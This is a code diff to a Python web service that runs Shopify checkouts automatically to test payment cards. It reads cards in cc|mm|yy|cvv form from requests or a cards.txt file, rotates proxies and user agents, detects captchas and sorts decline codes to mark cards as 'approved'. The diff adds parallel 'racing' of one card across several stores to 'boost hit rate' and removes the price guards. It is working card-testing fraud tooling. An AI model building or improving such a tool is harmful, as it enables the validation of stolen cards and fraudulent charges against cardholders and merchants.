-                sitemap_url = f"{base_url}/sitemap_products_1.xml"
-                smap_resp = await session.get(sitemap_url, allow_redirects=True)
-                if smap_resp.status_code == 200:
-                    root = ET.fromstring(smap_resp.content)
-                    urls = []
-                    for child in root:
-                        if child.tag.endswith('url'):
-                            for loc in child:
-                                if loc.tag.endswith('loc'):
-                                    urls.append(loc.text)
+                        if price < cheapest_any_price:
+                            cheapest_any_price = price
+                            cheapest_any       = entry
 
-                    if urls:
-                        sample_urls = random.sample(urls, min(25, len(urls)))
-                        for purl in sample_urls:
-                            try:
-                                p_resp = await session.get(purl, allow_redirects=True)
-                                matches = _re.finditer(
-                                    r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)',
-                                    p_resp.text,
-                                )
-                                for m in matches:
-                                    variant_id = m.group(1)
-                                    price = float(m.group(2))
-                                    if price <= 0:
-                                        continue
-                                    entry = {
-                                        "site":       base_url,
-                                        "price":      f"{price:.2f}",
-                                        "price_f":    price,
-                                        "variant_id": str(variant_id),
-                                        "title":      "Product",
-                                        "handle":     "",
-                                    }
-                                    any_variant.append(entry)
-                                    if price < cheapest_any_price:
-                                        cheapest_any_price = price
-                                        cheapest_any       = entry
-                                    if price <= max_price:
-                                        candidates.append(entry)
-                                        if price < best_price:
-                                            best_price = price
-                                            best       = entry
-                            except Exception:
-                                pass
-            except Exception:
-                pass
+                        if price <= max_price:
+                            candidates.append(entry)
 
-            if not any_variant:
-                err = "No products found"
+            fallback_used = False
+            if not candidates and cheapest_any is not None:
+                candidates = [cheapest_any]
+                fallback_used = True
+                log.warning(
+                    "[API] No variant under $%.2f on %s — falling back to cheapest ($%.2f)",
+                    max_price, hostname, cheapest_any_price,
+                )
+
+            if not candidates:
+                err = f"No products under ${max_price:.2f} and no alternatives"
                 _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now}
                 return None, [], err
-        else:
-            for product in all_variants:
-                for variant in product.get("variants", []):
-                    try:
-                        avail = variant.get("available", True)
-                        if avail is False:
-                            continue
-                        price = float(variant.get("price") or "0")
-                    except (ValueError, TypeError):
-                        continue
-                    if price <= 0:
-                        continue
 
-                    entry = {
-                        "site":       base_url,
-                        "price":      f"{price:.2f}",
-                        "price_f":    price,
-                        "variant_id": str(variant["id"]),
-                        "title":      product.get("title", "Product"),
-                        "handle":     product.get("handle", ""),
-                    }
-                    any_variant.append(entry)
+            best = _preferred_variant(candidates, max_price)
 
-                    if price < cheapest_any_price:
-                        cheapest_any_price = price
-                        cheapest_any       = entry
+            _product_cache[hostname] = {
+                "product":    best,
+                "candidates": candidates,
+                "err":        None,
+                "ts":         now,
+                "fallback":   fallback_used,
+            }
+            return best, candidates, None
 
-                    if price <= max_price:
-                        candidates.append(entry)
-                        if price < best_price:
-                            best_price = price
-                            best       = entry
-
-        # ── Fallback: cheapest product on site if none in range ──────────
-        fallback_used = False
-        if not candidates and cheapest_any is not None:
-            candidates = [cheapest_any]
-            best       = cheapest_any
-            best_price = cheapest_any_price
-            fallback_used = True
-            log.warning(
-                "[API] No variant under $%.2f on %s — falling back to cheapest ($%.2f)",
-                max_price, hostname, cheapest_any_price,
-            )
-
-        if not best:
-            err = f"No products under ${max_price:.2f} and no alternatives"
-            _product_cache[hostname] = {"product": None, "candidates": [], "err": err, "ts": now}
-            return None, [], err
-
-        _product_cache[hostname] = {
-            "product":    best,
-            "candidates": candidates,
-            "err":        None,
-            "ts":         now,
-            "fallback":   fallback_used,
-        }
-        return best, candidates, None
-
-    except (asyncio.TimeoutError, RequestsError):
-        err = "Timeout"
-        return None, [], err
-    except Exception as ex:
-        return None, [], str(ex)
-    finally:
-        if owned:
-            res = session.close()
-            if asyncio.iscoroutine(res):
-                await res
+        except (asyncio.TimeoutError, RequestsError):
+            return None, [], "Timeout"
+        except Exception as ex:
+            return None, [], str(ex)
+        finally:
+            if own_session:
+                res = session.close()
+                if asyncio.iscoroutine(res):
+                    await res
 
 
 # ---------------------------------------------------------------------------
@@ -959,18 +1020,6 @@ async def validate_card(
     proxy_str:  Optional[str] = None,
     max_price:  Optional[float] = None,
 ) -> dict:
-    """
-    Full Shopify checkout flow:
-      1. Add to cart
-      2. Get checkout page  →  extract session token
-      3. Shipping proposal  (GraphQL)
-      4. Delivery proposal  (GraphQL)
-      5. Tokenize card      (PCI vault)
-      6. Submit mutation    (GraphQL)
-      7. Poll receipt       (GraphQL, if needed)
-
-    Returns a dict with Response, Gateway, Price, Proxy, Status, Charged, Approved, Time.
-    """
     t0       = time.time()
     gateway  = "UNKNOWN"
     price    = "0.00"
@@ -981,39 +1030,20 @@ async def validate_card(
     site_url = site_url.strip()
     ourl     = site_url if site_url.startswith("http") else f"https://{site_url}"
     hostname = urlparse(ourl).netloc
-    proxy    = _parse_proxy(proxy_str)
-    ua       = random.choice(USER_AGENTS)
+
+    # Fix 12: sticky UA per site
+    ua = _site_ua.get(hostname) or random.choice(USER_AGENTS)
 
     def _r(response: str, charged: str = "False", approved: str = "False",
            message: Optional[str] = None,
            is_site_error: Optional[bool] = None,
            proxy_dead: bool = False) -> dict:
-        """
-        Build a uniform response dict matching msh.py's expectations.
-
-        Response      — classified code (ORDER_PLACED / INSUFFICIENT_FUNDS / etc.)
-        Message       — human-readable detail (defaults to the response code)
-        code          — alias of Response
-        decline_code  — alias of Response
-        Gateway       — detected payment gateway
-        Gate          — legacy alias of Gateway
-        Price         — product price string ("5.00")
-        Proxy         — "Live" or "Dead" (proxy health)
-        Status        — True for real card results, False for site errors
-        Charged       — "True"/"False"
-        Approved      — "True"/"False"
-        Retry         — True if msh.py should retry with a new site
-        """
         code_upper = response.upper()
-        # Auto-detect site error if not explicitly overridden
         if is_site_error is None:
             is_site_error = code_upper not in KNOWN_CARD_RESPONSES
-
         final_gateway = gateway if gateway and gateway != "UNKNOWN" else "Shopify Payments"
         proxy_status  = "Dead" if proxy_dead else "Live"
-
         return {
-            # ── Fields msh.py reads ──────────────────────────────────
             "Response":     response,
             "Message":      message or response,
             "code":         response,
@@ -1022,8 +1052,6 @@ async def validate_card(
             "Price":        price,
             "Proxy":        proxy_status,
             "Status":       (not is_site_error),
-
-            # ── Extra detail (legacy + debugging) ────────────────────
             "Gate":         final_gateway,
             "CC":           f"{cc}|{month}|{year}|{cvv}",
             "Product":      product_title,
@@ -1033,6 +1061,12 @@ async def validate_card(
             "Time":         f"{round(time.time() - t0, 2)}s",
             "Retry":        is_site_error,
         }
+
+    # Fix 2: circuit breaker — short-circuit blacklisted sites
+    if not _is_site_available(hostname):
+        return _r("SITE_ERROR",
+                  message=f"Site {hostname} is temporarily blacklisted",
+                  is_site_error=True)
 
     sem = _site_semaphores[hostname]
     session, owned = _make_session(proxy_str)
@@ -1048,44 +1082,65 @@ async def validate_card(
             state  = addr["zoneCode"]
             s_zip  = addr["postalCode"]
 
-            # ── 0. Fetch product if no variant supplied ──────────────────
-            best, all_candidates, err = await _fetch_products(ourl, proxy_str)
-
-            # Filter candidates under effective_max_price
-            if all_candidates:
-                candidates_under_max = [c for c in all_candidates if float(c.get("price", 999999)) <= effective_max_price]
+            # ── 0. Fetch product ──
+            # Fix 3: check variant cache first
+            cached_v = _variant_cache.get(hostname)
+            if (not variant_id
+                and cached_v
+                and (time.time() - cached_v["ts"]) < VARIANT_TTL):
+                variant_id    = cached_v["variant"]["variant_id"]
+                price         = cached_v["variant"]["price"]
+                product_title = cached_v["variant"].get("title", "")
+                all_candidates = [cached_v["variant"]]
             else:
-                candidates_under_max = [best] if (best and float(best.get("price", 999999)) <= effective_max_price) else []
+                # Fix 4: pass session for reuse
+                best, all_candidates, err = await _fetch_products(
+                    ourl, proxy_str, max_price=effective_max_price, session=session,
+                )
 
-            if not variant_id:
-                if not candidates_under_max:
-                    return _r(f"NO_PRODUCT: {err or f'No products under ${effective_max_price:.2f}'}",
+                if not all_candidates and not best:
+                    return _r(f"NO_PRODUCT: {err or 'No products available'}",
                               message=err or "No products",
                               is_site_error=True)
-                chosen_prod   = random.choice(candidates_under_max)
-                variant_id    = chosen_prod["variant_id"]
-                price         = chosen_prod["price"]
-                product_title = chosen_prod.get("title", "")
-            else:
-                matched = next(
-                    (c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)),
-                    None,
-                )
-                if not matched:
-                    return _r(f"PRICE_OVER_MAX: variant {variant_id} is not available",
-                              message="Variant not found",
-                              is_site_error=True)
-                price         = matched["price"]
-                product_title = matched.get("title", "")
 
-            # Hard guard on the resolved base price.
-            try:
-                if float(price) > effective_max_price:
-                    return _r(f"PRICE_OVER_MAX: base price ${price} > ${effective_max_price:.2f}",
-                              message=f"${price} > ${effective_max_price:.2f}",
+                pick_pool = list(all_candidates) if all_candidates else ([best] if best else [])
+                if not pick_pool:
+                    return _r(f"NO_PRODUCT: {err or 'No products available'}",
+                              message=err or "No products",
                               is_site_error=True)
-            except (ValueError, TypeError):
-                pass
+
+                if not variant_id:
+                    chosen = _preferred_variant(pick_pool, effective_max_price)
+                    variant_id    = chosen["variant_id"]
+                    price         = chosen["price"]
+                    product_title = chosen.get("title", "")
+                    # Cache the choice
+                    _variant_cache[hostname] = {
+                        "variant": {
+                            "variant_id":    variant_id,
+                            "price":         price,
+                            "title":         product_title,
+                            "price_f":       chosen.get("price_f"),
+                            "site":          chosen.get("site"),
+                            "handle":        chosen.get("handle", ""),
+                        },
+                        "ts": time.time(),
+                    }
+                else:
+                    matched = next(
+                        (c for c in pick_pool if str(c.get("variant_id")) == str(variant_id)),
+                        None,
+                    )
+                    if not matched:
+                        return _r(f"PRICE_OVER_MAX: variant {variant_id} is not available",
+                                  message="Variant not found",
+                                  is_site_error=True)
+                    price         = matched["price"]
+                    product_title = matched.get("title", "")
+
+            # NOTE: The old hard price guard on total price was removed.
+            # The cheapest-product fallback may legitimately push the total
+            # above effective_max_price by design.
 
             base_headers = {
                 "User-Agent":         ua,
@@ -1099,11 +1154,10 @@ async def validate_card(
                 "sec-ch-ua-platform": '"Windows"',
             }
 
-            # ── 1. Add to cart ──────────────────────────────────────────
+            # ── 1. Add to cart ──
             cart_added = False
             for payload, ct in [
-                (f"id={variant_id}&quantity=1",
-                 "application/x-www-form-urlencoded"),
+                (f"id={variant_id}&quantity=1", "application/x-www-form-urlencoded"),
                 (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                  "application/json"),
             ]:
@@ -1122,7 +1176,7 @@ async def validate_card(
             if not cart_added:
                 return _r("CART_FAILED", message="Could not add to cart", is_site_error=True)
 
-            # ── 2. Get checkout page ────────────────────────────────────
+            # ── 2. Get checkout page ──
             try:
                 cr = await session.post(
                     f"{ourl}/checkout/",
@@ -1140,10 +1194,25 @@ async def validate_card(
                           is_site_error=True)
 
             lower_url = checkout_url.lower()
-            if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
+            if "login" in lower_url or "/account" in lower_url:
                 return _r("SITE_REQUIRES_LOGIN", message="Store requires login", is_site_error=True)
 
-            # Extract attempt token from URL
+            # Fix 9: fast password-store detection
+            early = page_text[:5000].lower()
+            if ("enter password" in early or "storefront password" in early
+                    or 'name="password"' in early and "login" in lower_url):
+                return _r("SITE_REQUIRES_LOGIN",
+                          message="Store is password-protected",
+                          is_site_error=True)
+
+            # Fix 10: fast captcha detection
+            if any(k in early for k in ("hcaptcha", "recaptcha", "g-recaptcha",
+                                          "checkpoint.challenge", "captcha_required",
+                                          "cf-challenge")):
+                return _r("CAPTCHA_REQUIRED",
+                          message="Bot challenge detected",
+                          is_site_error=True)
+
             m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
             if m:
                 attempt_token = m.group(1)
@@ -1153,12 +1222,10 @@ async def validate_card(
             if not attempt_token or len(attempt_token) < 4:
                 return _r("NO_ATTEMPT_TOKEN", message="No attempt token in URL", is_site_error=True)
 
-            # Extract session token
             sst = _extract_sst(page_text, dict(cr.headers))
             if not sst:
                 return _r("NO_SESSION_TOKEN", message="No session token in HTML", is_site_error=True)
 
-            # Extract misc tokens
             queue_token = (
                 _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                 _extract(page_text, '"queueToken":"', '"')
@@ -1168,8 +1235,6 @@ async def validate_card(
                 _extract(page_text, '"stableId":"', '"') or
                 "1"
             )
-
-            # Merchandise GID
             merch_gid = (
                 _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                 _extract(page_text, "ProductVariantMerchandise/", '&q') or
@@ -1177,7 +1242,6 @@ async def validate_card(
                 str(variant_id)
             )
 
-            # Currency
             for s, e in [
                 ('currencyCode&quot;:&quot;', "&quot;"),
                 ('"currencyCode":"', '"'),
@@ -1187,7 +1251,6 @@ async def validate_card(
                     currency = val.upper()
                     break
 
-            # Re-select address based on detected currency (initial pick used URL only)
             addr         = _pick_address(ourl, currency)
             country_code = addr["countryCode"]
             phone        = addr["phone"]
@@ -1196,7 +1259,6 @@ async def validate_card(
             state        = addr["zoneCode"]
             s_zip        = addr["postalCode"]
 
-            # Subtotal
             subtotal = (
                 _extract(page_text,
                          'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
@@ -1208,7 +1270,6 @@ async def validate_card(
                 m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                 subtotal = m2.group(1) if m2 else "0.01"
 
-            # Build ID & source token
             unescaped  = page_text.replace("&quot;", '"').replace("&amp;", "&")
             build_id   = None
             m3         = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
@@ -1244,7 +1305,6 @@ async def validate_card(
             merch_id_full   = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
             variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"
 
-            # ── Build base shipping variables (deep-copyable template) ──
             def _base_vars() -> dict:
                 return {
                     "sessionInput":  {"sessionToken": sst},
@@ -1336,7 +1396,7 @@ async def validate_card(
                     "cartMetafields": [],
                 }
 
-            # ── 3. Shipping proposal ─────────────────────────────────────
+            # ── 3. Shipping proposal ──
             ship_vars      = _base_vars()
             resp_json: Any = None
 
@@ -1377,7 +1437,6 @@ async def validate_card(
             if not resp_json or not (resp_json.get("data") or {}).get("session"):
                 return _r("GRAPHQL_ERROR", message="No session in shipping response", is_site_error=True)
 
-            # Refresh session token from shipping proposal response
             try:
                 _ship_sst = r.headers.get("x-checkout-one-session-token")
                 if _ship_sst:
@@ -1389,7 +1448,6 @@ async def validate_card(
             session_data = resp_json["data"]["session"]
             negotiate    = session_data.get("negotiate") or {}
 
-            # Check negotiate-level errors first
             neg_errors = negotiate.get("errors") or []
             if neg_errors:
                 code = _parse_gql_errors(neg_errors)
@@ -1415,7 +1473,6 @@ async def validate_card(
             running_total_data = seller.get("runningTotal") or {}
             running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")
 
-            # Delivery info
             delivery_data     = seller.get("delivery") or {}
             delivery_strategy = ""
             shipping_amount   = 0.0
@@ -1433,7 +1490,6 @@ async def validate_card(
                         except (ValueError, TypeError):
                             shipping_amount = 0.0
 
-            # Tax
             tax_data   = seller.get("tax") or {}
             tax_amount = 0.0
             if tax_data.get("__typename") == "FilledTaxTerms":
@@ -1445,7 +1501,6 @@ async def validate_card(
                 except (ValueError, TypeError):
                     pass
 
-            # Payment method
             payment_data       = seller.get("payment") or {}
             payment_identifier = None
             if payment_data.get("__typename") == "FilledPaymentTerms":
@@ -1457,20 +1512,11 @@ async def validate_card(
                         detected_gateway = (pm.get("extensibilityDisplayName") or
                                             pm.get("name") or pm.get("brand") or
                                             pm.get("displayName") or "Shopify Payments")
-                        # Only proceed if the gateway is explicitly Shopify Payments
                         if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                             payment_identifier = pid
                             gateway = detected_gateway
                             price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
-                            try:
-                                if float(price) > MAX_PRICE:
-                                    return _r(
-                                        f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}",
-                                        message=f"Total ${price} > ${MAX_PRICE:.2f}",
-                                        is_site_error=True
-                                    )
-                            except (ValueError, TypeError):
-                                pass
+                            # No total-price guard here.
                             break
 
             if not payment_identifier:
@@ -1478,10 +1524,9 @@ async def validate_card(
                           message="Store does not use Shopify Payments",
                           is_site_error=True)
 
-            # ── 4. Delivery proposal ─────────────────────────────────────
+            # ── 4. Delivery proposal ──
             deliv_vars = copy.deepcopy(ship_vars)
             deliv_vars["sessionInput"]["sessionToken"] = sst
-
             deliv_vars["delivery"]["deliveryLines"][0].update({
                 "destination": {
                     "streetAddress": {
@@ -1529,17 +1574,10 @@ async def validate_card(
                           "operationName": "Proposal"},
                 )
                 d_resp = orjson.loads(dr.content)
-                log.debug("delivery proposal response keys: %s",
-                          list(d_resp.keys()) if isinstance(d_resp, dict) else type(d_resp))
-                if "errors" in d_resp and "data" not in d_resp:
-                    log.debug("delivery proposal schema errors: %s",
-                              [e.get("message") for e in d_resp.get("errors", [])][:3])
-                # Refresh session token from delivery response
                 _del_sst = dr.headers.get("x-checkout-one-session-token")
                 if _del_sst:
                     sst = _del_sst
                     gql_headers["x-checkout-one-session-token"] = sst
-                # Handle SubmittedForCompletion from delivery step (digital goods / auto-submit)
                 d_result = (
                     d_resp.get("data", {}).get("session", {})
                     .get("negotiate", {}).get("result", {})
@@ -1550,7 +1588,6 @@ async def validate_card(
                         return _r("NO_PAYMENT_REQUIRED",
                                   message="Order auto-submitted before card entry",
                                   is_site_error=True)
-                    # Update running_total from delivery seller proposal
                     d_seller = d_result.get("sellerProposal") or {}
                     d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                     d_amt    = d_total.get("value", {}).get("amount") or d_total.get("amount")
@@ -1560,16 +1597,6 @@ async def validate_card(
                             price = f"{float(running_total):.2f}"
                         except (ValueError, TypeError):
                             pass
-                        try:
-                            if float(price) > MAX_PRICE:
-                                return _r(
-                                    f"PRICE_OVER_MAX: total ${price} > ${MAX_PRICE:.2f}",
-                                    message=f"Total ${price} > ${MAX_PRICE:.2f}",
-                                    is_site_error=True
-                                )
-                        except (ValueError, TypeError):
-                            pass
-                    # Extract delivery strategy from delivery response
                     d_delivery = d_seller.get("delivery") or {}
                     if d_delivery.get("__typename") == "FilledDeliveryTerms":
                         d_d_lines = d_delivery.get("deliveryLines") or []
@@ -1580,7 +1607,6 @@ async def validate_card(
                                 delivery_strategy = d_selected["handle"]
                             elif d_strategies:
                                 delivery_strategy = d_strategies[0].get("handle", delivery_strategy)
-                            # Update shipping amount from delivery response
                             if d_strategies:
                                 d_ship_amt = d_strategies[0].get("amount") or {}
                                 try:
@@ -1590,7 +1616,6 @@ async def validate_card(
                                     )
                                 except (ValueError, TypeError):
                                     pass
-                    # Update tax from delivery response
                     d_tax = d_seller.get("tax") or {}
                     if d_tax.get("__typename") == "FilledTaxTerms":
                         d_tax_amt = d_tax.get("totalTaxAmount") or {}
@@ -1604,7 +1629,7 @@ async def validate_card(
             except Exception as ex:
                 log.debug("delivery proposal error: %s", ex)
 
-            # ── 5. Tokenize card ─────────────────────────────────────────
+            # ── 5. Tokenize card ──
             vault_payload = {
                 "credit_card": {
                     "number":             cc,
@@ -1637,10 +1662,7 @@ async def validate_card(
             token = None
             for vault_url in vault_endpoints:
                 try:
-                    vr = await session.post(
-                        vault_url, json=vault_payload,
-                        headers=vault_headers,
-                    )
+                    vr = await session.post(vault_url, json=vault_payload, headers=vault_headers)
                     vd = orjson.loads(vr.content)
                     token = vd.get("id")
                     if token:
@@ -1653,7 +1675,7 @@ async def validate_card(
                           message="Card vault rejected tokenization",
                           is_site_error=True)
 
-            # ── 6. Submit for completion ──────────────────────────────────
+            # ── 6. Submit for completion ──
             billing_addr = {
                 "streetAddress": {
                     "address1": street, "address2": "", "city": city,
@@ -1672,11 +1694,9 @@ async def validate_card(
                     "options": {"phone": phone},
                 }
                 submit_deliv_line["expectedTotalPrice"] = {"any": True}
-
                 submit_merch = copy.deepcopy(deliv_vars["merchandise"])
                 for ml in submit_merch.get("merchandiseLines", []):
                     ml["expectedTotalPrice"] = {"any": True}
-
                 return {
                     "query": MUTATION_SUBMIT,
                     "variables": {
@@ -1731,6 +1751,7 @@ async def validate_card(
                 }
 
             s_resp: dict = {}
+            s_data: dict = {}
             for submit_attempt in range(3):
                 try:
                     sr = await session.post(
@@ -1750,13 +1771,9 @@ async def validate_card(
                     log.debug("submit exception: %s", ex)
                     return _r("SUBMIT_FAILED", message=str(ex)[:100], is_site_error=True)
 
-                log.debug("submit[%d] response typename: %s", submit_attempt,
-                          (s_resp.get("data") or {}).get("submitForCompletion", {}).get("__typename"))
-
                 s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                 if not s_data:
                     errs = s_resp.get("errors") or []
-                    log.debug("submit no data, top-level errors: %s", errs)
                     if errs:
                         for err_item in errs:
                             for fld in ("code", "message"):
@@ -1764,13 +1781,14 @@ async def validate_card(
                                 if val:
                                     norm = _normalize_response(val)
                                     if norm != "CARD_DECLINED":
-                                        approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
+                                        approved = "True" if norm in ("INSUFFICIENT_FUNDS",
+                                                                       "INVALID_CVC",
+                                                                       "3DS_REQUIRED") else "False"
                                         return _r(norm, approved=approved, message=val[:120])
                     return _r("GRAPHQL_ERROR", message="Empty submit response", is_site_error=True)
 
                 stype = s_data.get("__typename", "")
 
-                # ConfirmChangeViolation → retry to accept changes
                 if stype == "SubmitRejected":
                     sub_errs = s_data.get("errors") or []
                     all_confirmable = all(
@@ -1780,11 +1798,20 @@ async def validate_card(
                         log.debug("submit[%d] ConfirmChangeViolation, retrying", submit_attempt)
                         await asyncio.sleep(0.5)
                         continue
+
+                # Fix 7: transient submit failures — retry once
+                if stype == "SubmitFailed" and submit_attempt < 2:
+                    reason_txt = str(s_data.get("reason") or "").upper()
+                    if any(k in reason_txt for k in ("TIMEOUT", "TRY_AGAIN",
+                                                       "ORDER_CREATION",
+                                                       "INTERNAL", "PROCESSING")):
+                        log.debug("submit[%d] transient fail, retrying: %s", submit_attempt, reason_txt)
+                        await asyncio.sleep(0.6)
+                        continue
                 break
 
             stype = s_data.get("__typename", "")
 
-            # ── Handle submit result types ────────────────────────────────
             if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                 receipt = s_data.get("receipt") or {}
                 rtype   = receipt.get("__typename", "")
@@ -1798,7 +1825,6 @@ async def validate_card(
                 if rtype == "FailedReceipt":
                     pe      = receipt.get("processingError") or {}
                     pe_type = pe.get("__typename", "")
-                    log.debug("FailedReceipt processingError: %s", pe)
                     if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                         return _r("NO_PRODUCT", message="Inventory failure", is_site_error=True)
                     if pe_type == "OrderCreationFailure":
@@ -1810,11 +1836,10 @@ async def validate_card(
                     raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                     norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                     approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
-                                                   "3DS_REQUIRED", "EXPIRED_CARD") else "False"
+                                                   "3DS_REQUIRED") else "False"
                     return _r(norm, approved=approved,
                               message=(code or msg or norm)[:120])
 
-                # ProcessingReceipt / WaitingReceipt → poll
                 rid = receipt.get("id")
                 if rid:
                     poll_body = {
@@ -1852,7 +1877,7 @@ async def validate_card(
                                 raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                                 norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                                 approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
-                                                               "3DS_REQUIRED", "EXPIRED_CARD") else "False"
+                                                               "3DS_REQUIRED") else "False"
                                 return _r(norm, approved=approved,
                                           message=(code or msg or norm)[:120])
                             if pt in ("ProcessingReceipt", "WaitingReceipt"):
@@ -1871,7 +1896,6 @@ async def validate_card(
 
             if stype == "SubmitRejected":
                 errs = s_data.get("errors") or []
-                log.debug("SubmitRejected errors: %s", errs)
                 if errs:
                     best_code = "CARD_DECLINED"
                     best_msg  = ""
@@ -1890,7 +1914,7 @@ async def validate_card(
                         if best_code != "CARD_DECLINED":
                             break
                     approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
-                                                       "3DS_REQUIRED", "EXPIRED_CARD") else "False"
+                                                       "3DS_REQUIRED") else "False"
                     return _r(best_code, approved=approved,
                               message=(best_msg or best_code)[:120])
                 return _r("CARD_DECLINED", message="No error detail")
@@ -1921,30 +1945,77 @@ async def validate_card(
 
 
 # ---------------------------------------------------------------------------
-# Valid gateway response codes (site is live)
+# Fix 1: multi-site racing
 # ---------------------------------------------------------------------------
-LIVE_RESPONSES = frozenset({
-    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
-    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
-    "INVALID_CARD", "THROTTLED",
-})
+async def validate_card_raced(
+    cc: str, month: str, year: str, cvv: str,
+    sites: list[str],
+    proxy_str: Optional[str] = None,
+    max_price: Optional[float] = None,
+    race_count: int = RACE_COUNT,
+) -> dict:
+    """
+    Race the same card against up to `race_count` sites in parallel.
+    Returns the first non-site-error result; cancels the rest.
+    """
+    if not sites:
+        return {
+            "Response": "SITE_ERROR", "Message": "No sites provided",
+            "Status": False, "Retry": True,
+        }
+
+    # Prefer non-blacklisted sites
+    live_sites = [s for s in sites if _is_site_available(urlparse(
+        s if s.startswith("http") else f"https://{s}").netloc)]
+    pool = live_sites if live_sites else sites
+    random.shuffle(pool)
+    picked = pool[: max(1, race_count)]
+
+    tasks = [
+        asyncio.create_task(validate_card(
+            cc, month, year, cvv, s,
+            proxy_str=proxy_str, max_price=max_price,
+        ))
+        for s in picked
+    ]
+
+    last_result: Optional[dict] = None
+    try:
+        for coro in asyncio.as_completed(tasks):
+            try:
+                res = await coro
+            except Exception:
+                continue
+            last_result = res
+            code = str(res.get("Response", "")).upper()
+            if code not in SITE_ERROR_CODES:
+                for t in tasks:
+                    if not t.done():
+                        t.cancel()
+                return res
+        return last_result or {
+            "Response": "SITE_ERROR", "Message": "All raced sites failed",
+            "Status": False, "Retry": True,
+        }
+    finally:
+        for t in tasks:
+            if not t.done():
+                t.cancel()
 
 
 # ---------------------------------------------------------------------------
 # Routes
 # ---------------------------------------------------------------------------
-
 @app.get("/shopify")
 async def shopify_route(
     site:      str           = Query(..., description="Shopify store URL"),
-    cc:        Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
-    proxy:     Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
+    cc:        Optional[str] = Query(None, description="cc|mm|yy|cvv"),
+    proxy:     Optional[str] = Query(None, description="ip:port or user:pass@ip:port"),
     max_price: Optional[float] = Query(None, description="Max product price override"),
     key:       Optional[str] = Query(None, description="API key"),
 ):
     """Validate a card against a Shopify store checkout."""
 
-    # ── API key check ──────────────────────────────────────────────
     if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
         log.warning("Rejected request — invalid key: %r", key)
         return JSONResponse(
@@ -1960,46 +2031,93 @@ async def shopify_route(
         if not card:
             return JSONResponse(
                 {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
-                status_code=400,
-            )
+                status_code=400)
     else:
         cards = _get_cards()
         if not cards:
             return JSONResponse(
-                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
-                status_code=400,
-            )
+                {"error": "No cards available. Create cards.txt."},
+                status_code=400)
         card = random.choice(cards)
 
     result = await validate_card(
         card["cc"], card["month"], card["year"], card["cvv"],
         site, proxy_str=proxy, max_price=max_price,
     )
-    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1
 
+    hostname = urlparse(site if site.startswith("http") else f"https://{site}").netloc
+    _record_site_result(hostname, result.get("Response", "UNKNOWN"))
+
+    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1
+    return JSONResponse(result)
+
+
+# ── Fix 1: racing endpoint ───────────────────────────────────────────────
+@app.get("/shopify-race")
+async def shopify_race_route(
+    sites:     str           = Query(..., description="Comma-separated site URLs"),
+    cc:        Optional[str] = Query(None, description="cc|mm|yy|cvv"),
+    proxy:     Optional[str] = Query(None, description="ip:port or user:pass@ip:port"),
+    max_price: Optional[float] = Query(None, description="Max product price override"),
+    race:      Optional[int] = Query(None, description="Number of sites to race"),
+    key:       Optional[str] = Query(None, description="API key"),
+):
+    """
+    Race one card against N sites in parallel. Returns the first non-site-error
+    response. Ideal for boosting hit rate — no need to burn 15 retries against
+    a dead site when a live one is available.
+    """
+    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
+        return JSONResponse(
+            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
+            status_code=401)
+
+    if not sites:
+        return JSONResponse({"error": "Missing 'sites' parameter"}, status_code=400)
+
+    site_list = [s.strip() for s in sites.split(",") if s.strip()]
+    if not site_list:
+        return JSONResponse({"error": "No valid sites provided"}, status_code=400)
+
+    if cc:
+        card = _parse_card(cc)
+        if not card:
+            return JSONResponse({"error": "Bad card format."}, status_code=400)
+    else:
+        cards = _get_cards()
+        if not cards:
+            return JSONResponse({"error": "No cards available."}, status_code=400)
+        card = random.choice(cards)
+
+    race_n = race if race and race > 0 else RACE_COUNT
+
+    result = await validate_card_raced(
+        card["cc"], card["month"], card["year"], card["cvv"],
+        site_list, proxy_str=proxy, max_price=max_price, race_count=race_n,
+    )
+
+    # Record per-site result for the site that actually answered
+    answered_site = result.get("Site", "")
+    if answered_site:
+        answered_host = urlparse(answered_site).netloc
+        _record_site_result(answered_host, result.get("Response", "UNKNOWN"))
+
+    _stats[f"race_response_{result.get('Response', 'UNKNOWN')}"] += 1
